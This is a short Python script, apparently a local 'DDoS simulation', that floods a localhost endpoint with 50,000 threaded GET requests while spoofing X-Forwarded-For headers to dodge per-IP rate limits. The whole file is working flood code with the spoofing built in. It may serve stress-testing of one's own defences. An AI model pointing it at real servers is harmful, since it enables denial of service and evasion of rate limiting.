import requests
import threading
import random

# Target server details
TARGET_URL = "http://127.0.0.1:5000/"
NUMBER_OF_THREADS = 100
REQUESTS_PER_THREAD = 500

# List of fake IP addresses to simulate the attack
FAKE_IP_ADDRESSES = [
    "192.168.1.1",
    "192.168.1.2",
    "192.168.1.3",
    "192.168.1.4",
    "192.168.1.5",
    "192.168.2.1",
    "192.168.2.2",
    "192.168.2.3",
    "192.168.2.4",
    "192.168.2.5"
]

# Function to perform a large number of requests with different fake IPs
def perform_requests():
    for _ in range(REQUESTS_PER_THREAD):
        fake_ip = random.choice(FAKE_IP_ADDRESSES)
        headers = {"X-Forwarded-For": fake_ip}
        try:
            response = requests.get(TARGET_URL, headers=headers)
            print(f"Request sent from {fake_ip}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request from {fake_ip} failed: {e}")

# Create and start multiple threads to simulate the attack
threads = []

for _ in range(NUMBER_OF_THREADS):
    thread = threading.Thread(target=perform_requests)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("DDoS simulation with multiple IPs completed.")
